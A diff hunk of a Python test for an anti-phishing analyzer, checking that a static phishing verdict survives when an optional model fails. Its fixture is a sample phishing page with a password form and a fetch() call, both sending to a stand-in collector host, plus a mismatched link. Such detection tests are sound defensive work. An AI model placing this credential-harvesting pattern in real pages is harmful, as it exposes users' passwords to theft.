@@ -82,7 +82,7 @@ def test_model_signal_never_blocks(empty_kb, monkeypatch):
 def test_failed_optional_model_does_not_downgrade_static_phishing(empty_kb, monkeypatch):
     monkeypatch.setattr("antiphish.analyzer.optional_deep_analysis", lambda text, **kwargs: ([], ["fixture model unavailable"]))
     body = b"<form action='https://collector.bad.example'><input type=password></form><script>fetch('https://collector.bad.example')</script><a href='https://collector.bad.example'>https://portal.example</a>"
-    report = Analyzer(empty_kb).analyze(body, name="phish.html", profile="deep")
+    report = Analyzer(empty_kb).analyze(body, name="phish.html", profile="deep",options={'laya':False,'text_model':False})
     assert report.verdict == Verdict.PHISHING
     assert report.analysis_status == AnalysisStatus.PARTIAL
     assert report.configuration['static_analysis_status'] == 'COMPLETE'
